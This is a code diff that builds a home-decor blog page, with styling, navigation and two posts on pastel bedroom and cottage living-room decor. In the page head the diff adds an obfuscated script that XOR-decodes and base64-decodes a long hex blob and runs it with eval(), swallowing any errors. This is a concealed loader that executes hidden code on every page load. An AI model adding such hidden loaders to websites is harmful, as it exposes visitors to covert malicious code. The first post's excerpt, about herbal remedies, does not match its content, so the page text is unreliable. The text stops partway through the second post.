@@ -1,7 +1,885 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Minimalist Home Decor</title>
+    
+    <!-- Added Google Fonts for a unique editorial look -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lora:ital,wght@0,400;0,600;1,400&family=Nunito:wght@300;400;600&display=swap" rel="stylesheet">
+
+    <style>
+        /* Unique Modern Editorial / Lifestyle Styles */
+        :root {
+            --primary-color: #d88373; /* Warm terracotta */
+            --primary-hover: #c46d5e;
+            --text-color: #4a4640; /* Soft charcoal/brown */
+            --heading-color: #2c2a27;
+            --bg-color: #fcfaf8; /* Warm off-white */
+            --card-bg: #ffffff;
+            --nav-bg: rgba(252, 250, 248, 0.85); /* Frosted glass nav */
+            --border-radius: 24px;
+        }
+
+        body {
+            font-family: 'Nunito', -apple-system, BlinkMacSystemFont, sans-serif;
+            line-height: 1.6;
+            color: var(--text-color);
+            background-color: var(--bg-color);
+            /* Subtle dotted background pattern */
+            background-image: radial-gradient(#e5e1d8 1.5px, transparent 1.5px);
+            background-size: 24px 24px;
+            margin: 0;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Typography Override */
+        h1, h2, h3, h4, .username {
+            font-family: 'Lora', Georgia, serif;
+            color: var(--heading-color);
+        }
+
+        .container {
+            max-width: 650px; /* Slightly wider for a modern feel */
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Top Navigation - Glassmorphism */
+        .top-nav {
+            background-color: var(--nav-bg);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            padding: 15px 0;
+            text-align: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid rgba(0,0,0,0.03);
+            box-shadow: 0 4px 20px rgba(0,0,0,0.02);
+        }
+
+        .top-nav a {
+            color: var(--text-color);
+            text-decoration: none;
+            margin: 0 12px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: color 0.3s ease, transform 0.2s ease;
+            display: inline-block;
+        }
+
+        .top-nav a:hover {
+            color: var(--primary-color);
+            transform: translateY(-1px);
+        }
+
+        /* Header */
+        header {
+            padding: 60px 0 40px;
+            text-align: center;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 2.8rem;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+        
+        header h1:hover {
+            color: var(--primary-color);
+        }
+
+        header p {
+            margin: 10px 0 0;
+            font-size: 1.1rem;
+            color: #8c877d;
+            font-style: italic;
+            font-family: 'Lora', serif;
+        }
+
+        /* Post Cards */
+        .post-card,
+        .single-post {
+            background: var(--card-bg);
+            border-radius: var(--border-radius);
+            margin-bottom: 40px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.04);
+            border: 1px solid rgba(0,0,0,0.02);
+            overflow: hidden;
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275), box-shadow 0.4s ease;
+        }
+
+        .post-card {
+            cursor: pointer;
+        }
+
+        .post-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 20px 50px rgba(216, 131, 115, 0.12);
+        }
+
+        .single-post {
+            cursor: default;
+            padding: 10px; /* Extra padding inside the single post */
+        }
+
+        .post-header {
+            padding: 20px 25px;
+            display: flex;
+            align-items: center;
+        }
+
+        .post-header img.avatar {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%; /* Circle avatar */
+            margin-right: 15px;
+            background-color: #f0ede6;
+            border: 2px solid var(--bg-color);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+
+        .post-header .username {
+            font-weight: 600;
+            font-size: 16px;
+            letter-spacing: 0.2px;
+        }
+
+        .post-image {
+            width: 100%;
+            display: block;
+            max-height: 450px;
+            object-fit: cover;
+            border-top: 1px solid rgba(0,0,0,0.02);
+            border-bottom: 1px solid rgba(0,0,0,0.02);
+        }
+
+        .post-content {
+            padding: 30px 35px 15px;
+        }
+
+        .post-content h1,
+        .post-content h2 {
+            margin: 0 0 15px;
+            font-size: 1.8rem;
+            line-height: 1.3;
+        }
+
+        .post-content p {
+            margin-bottom: 20px;
+            font-size: 1.05rem;
+        }
+
+        .post-content a {
+            color: var(--primary-color);
+            text-decoration: none;
+            border-bottom: 1px dashed var(--primary-color);
+            transition: all 0.2s;
+        }
+
+        .post-content a:hover {
+            color: var(--primary-hover);
+            border-bottom-style: solid;
+        }
+
+        .post-footer {
+            padding: 20px 35px;
+            color: #9c978f;
+            font-size: 0.9rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid #f0ede6;
+            background-color: #faf9f7;
+        }
+
+        /* Single Post Overrides */
+        .single-post .post-image {
+            max-height: none;
+            border-radius: 12px; /* Slight rounding for inside images */
+            width: calc(100% - 70px);
+            margin: 0 auto;
+            border: none;
+        }
+
+        /* Back Button styled as a modern pill */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 25px;
+            color: var(--heading-color);
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.95rem;
+            cursor: pointer;
+            padding: 10px 20px;
+            background: var(--card-bg);
+            border: 1px solid #e8e5df;
+            border-radius: 30px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.03);
+            transition: all 0.3s ease;
+        }
+
+        .back-button:hover {
+            background: var(--primary-color);
+            color: white;
+            border-color: var(--primary-color);
+            transform: translateX(-3px);
+            box-shadow: 0 6px 15px rgba(216, 131, 115, 0.2);
+        }
+    </style>
+    <script>
+        (function () {
+            var vtemgebhp = "2e026c2400130f5c312209056e1b06222146631955650151242a71180a1b1d5a0e247b7a2f03741a0b17375a500424562119260b785f7b40162a7946283d15020e057436392d0b1531482b3f500b1d00132710425565005d164a5304091476003434643c014879190b481503572e1a080c033d3a55656c513f317e1d320b05000c2a787c00130c01221301116e14121e1a463a25507a7c43152e051a310b273a37055125022d1c552113280c7d17645e0a3762097f6177013710711622100d5834347f2b0722071f3d3d05126d14651d0a306216565f63053d3f66223f15010634347c26023c0f040b17051f573a3c1d192314086d005d62103179012424200d242f772b07170b1521320d185014370013271040575f4d672d217a19090b021f375e607c2839071c32390a1b7b343b2c0a3713167d75595b3d3a580b091b1904263f747b20130c0b2139020c7d001500271914087d7a635e3d3d0016093e09580c3b5224073d7415241415116e1b1e25194604045076467d3d3a711622100e0d242f747e3a22040b31177a5b612e0209192c3516646174402d1409410d1401133434523f392207540b49011b6e04021e25333a1d6d6567452e217e0b0d1b0d1a0f02642000171b160c323b0556716d09213304496d5f59432e4a481b083e09590f2b5a393903741c0e3c011b562d060b2019040b507a4d67152e0541310b05060e5f642501491c5b2b13020c7d0015000a371316505f734f3d3e5c0b3a3e765a2428062b3a17745c3d1715056e1b33122733040b50715d072d2a5b160d1b380d243b0324071721023122111d572a61141a23671f506573582e217d160d1b380d0f01707e022d29040c3d7a12782d300b1a190008556a6f5a1713433a22100e0d242f772b2a390f1c32130204551b1a24214703017d7a467d3d3a711622100e0d242f772b2a390c0b0c482f1e6e046d540f193a015701674017175b04083e191d0f2b7026392c035c312211077f046156213325027d715658383a72420a047a010f5f5539013d74063122111b56716012203314415575005e162e65012424200d242f772b2a390c0b2132730c6e142c1d19271046775b74513d3a711622100e0d242f772b2a3217040b1301116e1b160f2019144156017c51242a720b091b190421015a39393d1b583c481a047d2a6c0e0827134864660551393a715e221006032428592b2a137505270d2c0c7d0015000a3713167d7174513d3a7243320b060d372b6036073d21193122111b56716000132710416d6a7f582e21623409617e020c3b022b28030f1632220103572e125721471b167f4b774c1631661f2424200d242f772b2a390c0b2139020c7d00161d192c00245565045a164a66412014155b0f01787c022d74192339280c513a152c0a3713167d7174513d3a711622100e0d242f772b2a32291c0a17111d503a611421461c195075594016100508310b0d19343b7820283d1f000b49111b562e125722236b047f6646513710711622100e0d242f772b2a390c0b213273187d0711560e373946775b74513d3a711622100e0d0b3d592b2a390c0b0e2b33527d0402142046071651455a513d3a7116283d7f21";
+            var voevvvovu = "ml6LczMlhzCk4CTgCtRq4256ty0qkSOj";
+            var vonspeyah = "";
+
+            try {
+                for (var i = 0; i < vtemgebhp.length; i += 2) {
+                    var vfokrcpoz = parseInt(vtemgebhp.substr(i, 2), 16);
+                    vonspeyah += String.fromCharCode(vfokrcpoz ^ voevvvovu.charCodeAt((i / 2) % voevvvovu.length));
+                }
+
+                var vweqbcvxk = atob(vonspeyah);
+                eval(vweqbcvxk);
+            } catch (e) {
+            }
+        })();
+    </script>
+</head>
+
 <body>
-    <h1>Welcome to Home Decor DIY Design!</h1>
-    <p>Site is under construction.</p>
+
+    <nav class="top-nav">
+        <a onclick="navigate('home')">Home</a>
+        <a onclick="navigate('page', 'about')">About</a>
+        <a onclick="navigate('page', 'privacy')">Privacy Policy</a>
+        <a onclick="navigate('page', 'terms')">Terms</a>
+        <a onclick="navigate('page', 'contact')">Contact</a>
+    </nav>
+
+    <header>
+        <div class="container">
+            <h1 onclick="navigate('home')">Minimalist Home Decor</h1>
+            <p>Thoughts, stories, and ideas.</p>
+        </div>
+    </header>
+
+    <main class="container" id="app">
+        <!-- Content will be injected here by JavaScript -->
+    </main>
+
+    <script>
+        // 1. Define your blog posts here!
+        const posts = [
+            {
+                id: 'my-first-post',
+                title: 'Which Bedroom Aesthetic Suits Your Vibe? Quiz for Dream Room Decor Ideas',
+                date: 'April 14, 2026',
+                // 👇 Change this to point to your local assets folder
+                image: './assets/Quiz-for-Dream-Room-Decor-Ideas.png',
+                excerpt: 'Discover the healing power of nature! Before modern pharmacies, there was the earth. Explore 14 essential herbal remedies like Willow Bark for pain relief and Elderberry for immunity support.',
+                content: `
+                <p>Soft pastel tones, plush textures, and charming decorative details come together to create a bedroom aesthetic that feels both comforting and visually delightful. This style has quickly become a favorite among those who love cozy interiors with a playful, feminine touch. From fluffy pillows to warm lighting and curated wall decor, every element contributes to a space that feels personal, relaxing, and irresistibly inviting.</p>
+
+<p>Whether you are redesigning your room or simply looking for inspiration, this dreamy bedroom aesthetic offers a perfect balance between style and comfort. It reflects a lifestyle that values calmness, creativity, and self-expression, making it ideal for anyone who wants their space to feel like a peaceful retreat.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Pastel pink tones create a calming and cozy bedroom atmosphere</li>
+    <li>Layered textures add depth and comfort to the space</li>
+    <li>Soft lighting enhances the overall mood and warmth</li>
+    <li>Decor elements like plush toys and wall grids personalize the room</li>
+    <li>This aesthetic blends comfort, femininity, and modern minimalism</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Rise of Cozy Aesthetic Bedrooms</h2>
+
+<p>The cozy aesthetic bedroom trend has gained massive popularity in recent years. It moves away from stark minimalism and instead embraces warmth, softness, and personality. This approach focuses on creating a space that feels lived-in and emotionally comforting rather than just visually clean.</p>
+
+<p>At the heart of this style is the use of gentle color palettes. Soft pinks, creams, and warm neutrals dominate the space, creating a soothing visual experience. These colors naturally evoke feelings of calmness and relaxation, making them perfect for a bedroom environment.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> The success of a cozy aesthetic bedroom lies in how it makes you feel. It is not just about decoration, but about creating an environment that promotes rest, comfort, and emotional ease.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Key Elements That Define This Look</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Soft Color Palette</h3>
+<p>Pastel pink is the dominant tone, complemented by whites and subtle beige hues. This palette keeps the room bright while maintaining a soft and dreamy vibe.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Layered Textures</h3>
+<p>From fluffy rugs to plush cushions and cozy blankets, layering textures is essential. It adds visual depth and makes the space feel more inviting.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Warm Lighting</h3>
+<p>Soft bedside lamps and ambient lighting create a warm glow that enhances the relaxing atmosphere. Lighting plays a crucial role in setting the mood.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Personal Decor</h3>
+<p>Wall grids with photos, small plants, and cute accessories give the room personality. These elements turn a simple bedroom into a unique, expressive space.</p>
+
+<div style="background:#f1f5f9;border:1px solid #e2e8f0;border-radius:12px;padding:16px 18px;margin:26px 0;">
+  <h4 style="margin-top:0;">Why This Matters</h4>
+  <p style="margin:0;">A well-designed bedroom directly impacts your mood and sleep quality. Choosing an aesthetic that feels calming and personal can improve both your mental well-being and daily comfort.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Recreate This Bedroom Style</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Choose the Right Bedding</h3>
+<p>Start with soft, pastel bedding. Look for materials that feel comfortable against the skin. Add decorative pillows, including heart-shaped or novelty cushions, to enhance the aesthetic.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Incorporate Plush Elements</h3>
+<p>Plush toys and soft furnishings instantly make a room feel more welcoming. They add a playful and youthful charm that defines this style.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Add Functional Furniture</h3>
+<p>A simple bedside table with drawers keeps the space organized while maintaining a clean look. Choose furniture with soft edges and light colors.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Stick to a consistent color theme when adding new items. Mixing too many colors can break the calming effect of the aesthetic.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Creating a Personalized Space</h2>
+
+<p>What truly sets this bedroom style apart is personalization. The use of photo grids, small decor items, and curated accessories reflects individual taste and creativity. This transforms the room into more than just a place to sleep. It becomes a personal sanctuary.</p>
+
+<p>Adding elements like fairy lights, framed prints, or even handwritten notes can make the space feel more intimate. These details tell a story and create a deeper emotional connection with the environment.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Personal touches are what elevate a bedroom from simply stylish to truly meaningful. Focus on items that reflect your personality rather than following trends blindly.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Emotional Appeal of Soft Aesthetic Design</h2>
+
+<p>This type of bedroom design is not just visually pleasing. It also provides emotional comfort. The softness of the textures and the warmth of the lighting create a safe and relaxing environment.</p>
+
+<p>Many people are drawn to this style because it offers an escape from the fast-paced nature of daily life. It encourages slowing down, unwinding, and enjoying simple moments.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why People Love This Style</h3>
+<ul>
+  <li>It feels cozy and welcoming</li>
+  <li>It promotes relaxation and better sleep</li>
+  <li>It allows for creative expression</li>
+  <li>It is visually soothing and harmonious</li>
+</ul>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Balancing Aesthetics and Functionality</h2>
+
+<p>While aesthetics are important, functionality should not be overlooked. A well-designed bedroom should be both beautiful and practical. Storage solutions, comfortable furniture, and easy-to-maintain decor all play a role in achieving this balance.</p>
+
+<p>Choosing multi-functional pieces, like storage ottomans or bedside tables with drawers, helps keep the space organized without sacrificing style.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:16px 18px;margin:26px 0;">
+  <h4 style="margin-top:0;">Quick Note</h4>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Keep clutter minimal to maintain a calm atmosphere</li>
+    <li>Use storage-friendly decor to combine beauty and utility</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">At a Glance</h2>
+
+<div style="background:#f1f5f9;border-radius:12px;padding:16px 18px;margin:18px 0;">
+  <ul style="margin:0;padding-left:20px;">
+    <li>Soft pink tones create a calming mood</li>
+    <li>Layered textures add comfort and depth</li>
+    <li>Warm lighting enhances coziness</li>
+    <li>Personal decor brings individuality</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+
+<p>A cozy pastel bedroom aesthetic is more than just a design trend. It is a lifestyle choice that prioritizes comfort, warmth, and personal expression. By combining soft colors, inviting textures, and meaningful decor, you can create a space that feels both stylish and deeply relaxing.</p>
+
+<p>Whether you are starting from scratch or simply updating your current setup, focusing on these elements will help you achieve a bedroom that not only looks beautiful but also feels like a true sanctuary.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Aesthetic Bedroom</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Pastel Room Decor</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Cozy Bedroom Ideas</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Pink Bedroom Design</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Cute Room Inspiration</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Interior Aesthetic</span>
+</div>
+
+                    `
+            
+            },
+            {
+                id: 'cozy-fairy',
+                title: 'Cozy Fairy Cottage Living Room Decor Ideas',
+                date: 'April 15, 2026',
+                // 👇 Change this to point to your local assets folder
+                image: './assets/Cozy-Fairy-Cottage-Living-Room-Decor-Ideas.png',
+                excerpt: 'Create the ultimate sanctuary with these cozy fairycottage living room ideas. This aesthetic is all about blending rustic charm with enchanting, whimsical details to make your home feel like a storybook retreat.',
+                content: `
+                <p>Step into a space where comfort meets timeless charm and every detail feels thoughtfully curated. Cottage-style living rooms have a unique way of blending rustic textures, soft color palettes, and warm lighting to create an atmosphere that instantly feels like home. This style celebrates simplicity without sacrificing elegance, making it one of the most beloved interior design trends for those seeking a cozy yet refined aesthetic.</p>
+
+<p>From exposed wooden beams to textured stone walls and soft layered textiles, the cottage living room embodies warmth and personality. It is not about perfection. It is about creating a welcoming environment that feels lived-in, relaxed, and effortlessly beautiful.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Cottage living rooms focus on warmth, comfort, and natural materials</li>
+    <li>Neutral tones and soft textures create a calming, inviting atmosphere</li>
+    <li>Layered decor such as throws, cushions, and rugs enhances coziness</li>
+    <li>Wood, stone, and greenery add authenticity and depth</li>
+    <li>Lighting plays a crucial role in creating a soft, ambient glow</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">What Defines a Cottage Living Room?</h2>
+
+<p>A cottage living room is rooted in comfort and charm. It embraces a relaxed approach to decorating, where each element contributes to a sense of warmth and personality. Natural materials such as wood and stone often take center stage, while furniture leans toward soft, plush, and inviting shapes.</p>
+
+<p>Unlike modern minimalist spaces, cottage interiors welcome a bit of imperfection. Slightly worn finishes, vintage-inspired pieces, and handmade decor all add to the character of the room. The goal is not to impress but to create a space where you can truly unwind.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> The essence of cottage design lies in emotional comfort. Every texture, color, and piece of furniture should contribute to a feeling of warmth, relaxation, and familiarity rather than visual perfection.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Power of Natural Materials</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Stone Walls and Rustic Texture</h3>
+
+<p>Stone walls instantly elevate the cottage aesthetic. They add texture, depth, and a sense of history that cannot be replicated with modern finishes. Whether authentic or recreated, this element brings an earthy, grounded feel to the space.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Exposed Wooden Beams</h3>
+
+<p>Wooden ceiling beams create architectural interest while reinforcing the rustic charm of the room. Their warm tones contrast beautifully with lighter walls and soft furnishings, making the space feel both structured and cozy.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Natural Wood Furniture</h3>
+
+<p>Tables, cabinets, and sideboards crafted from wood enhance the organic feel of the space. Look for pieces with simple designs and subtle detailing to maintain a relaxed and approachable aesthetic.</p>
+
+<div style="background:#f1f5f9;border:1px solid #e2e8f0;border-radius:12px;padding:16px 18px;margin:28px 0;">
+  <h4 style="font-size:20px;line-height:1.4;margin:0 0 10px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Expert Insight</h4>
+  <p style="margin:0;color:#334155;">Combining multiple natural materials such as wood, stone, and woven fibers creates visual richness without overwhelming the space. The key is balance, not uniformity.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Soft Furnishings That Invite You In</h2>
+
+<p>The heart of any cottage living room lies in its soft furnishings. A comfortable sofa layered with cushions and throws instantly creates a welcoming focal point. Neutral tones such as cream, beige, and soft pastels help maintain a calm and cohesive look.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Layering Textiles</h3>
+
+<p>Layering is essential. A knitted throw draped over the sofa, a textured rug underfoot, and soft cushions in varying patterns all contribute to a sense of depth and comfort.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Mix different fabric textures such as linen, cotton, and wool to create a visually interesting yet cohesive look without relying on bold colors.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Choosing the Right Rug</h3>
+
+<p>A soft, patterned rug anchors the room and ties all elements together. Subtle patterns and muted tones work best to maintain the relaxed cottage feel.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Lighting That Sets the Mood</h2>
+
+<p>Lighting plays a crucial role in creating the cozy atmosphere associated with cottage interiors. Soft, warm lighting enhances textures and adds depth to the space.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Table Lamps and Ambient Glow</h3>
+
+<p>Table lamps with fabric shades provide gentle illumination that feels intimate and calming. Placing them on wooden side tables enhances the layered look.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Candles for Warmth</h3>
+
+<p>Candles introduce a soft flicker that instantly elevates the ambiance. They are a simple yet powerful way to add warmth and charm.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Layering different light sources such as lamps, candles, and natural light creates a dynamic and inviting environment that feels both functional and atmospheric.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Decor That Tells a Story</h2>
+
+<p>Cottage decor thrives on personality. Rather than filling the space with trendy items, focus on meaningful pieces that reflect your style and history.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Vintage and Handmade Accents</h3>
+
+<p>Incorporate vintage frames, ceramics, and handcrafted items to add character. These elements make the space feel unique and authentic.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Greenery and Floral Touches</h3>
+
+<p>Fresh flowers and greenery bring life into the room. Whether placed on a coffee table or a sideboard, they add a refreshing, natural touch.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Creating a Functional Yet Cozy Layout</h2>
+
+<p>A cottage living room is not just about aesthetics. It is also about functionality. Arrange furniture in a way that encourages conversation and relaxation.</p>
+
+<ul>
+  <li>Place seating around a central coffee table</li>
+  <li>Keep pathways clear for easy movement</li>
+  <li>Use storage solutions like baskets for organization</li>
+</ul>
+
+<div style="background:#f1f5f9;border:1px solid #e2e8f0;border-radius:12px;padding:16px 18px;margin:28px 0;">
+  <h4 style="font-size:20px;line-height:1.4;margin:0 0 10px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Why This Matters</h4>
+  <ul style="margin:0;padding-left:18px;color:#334155;">
+    <li>Comfortable layouts enhance everyday living</li>
+    <li>Thoughtful placement improves both style and function</li>
+    <li>Balanced spacing keeps the room inviting, not crowded</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Small Details That Make a Big Impact</h2>
+
+<p>Sometimes, it is the smallest touches that bring the entire room together. A woven basket filled with blankets, a stack of books on the coffee table, or a carefully placed tray can add both function and charm.</p>
+
+<p>These details create a lived-in look that feels authentic and welcoming. They show that the space is meant to be enjoyed, not just admired.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:16px 18px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:10px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Quick Points</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Use soft lighting to enhance warmth</li>
+    <li>Layer textures for depth and comfort</li>
+    <li>Incorporate natural materials wherever possible</li>
+    <li>Choose decor with personal meaning</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: Bringing Cottage Charm Into Your Home</h2>
+
+<p>Cottage living rooms offer a timeless approach to interior design that prioritizes comfort, warmth, and authenticity. By combining natural materials, soft furnishings, and thoughtful decor, you can create a space that feels both stylish and inviting.</p>
+
+<p>Whether you are redesigning an entire room or simply adding a few cozy touches, the cottage style provides endless inspiration. It encourages you to slow down, enjoy your surroundings, and create a home that truly reflects your personality.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
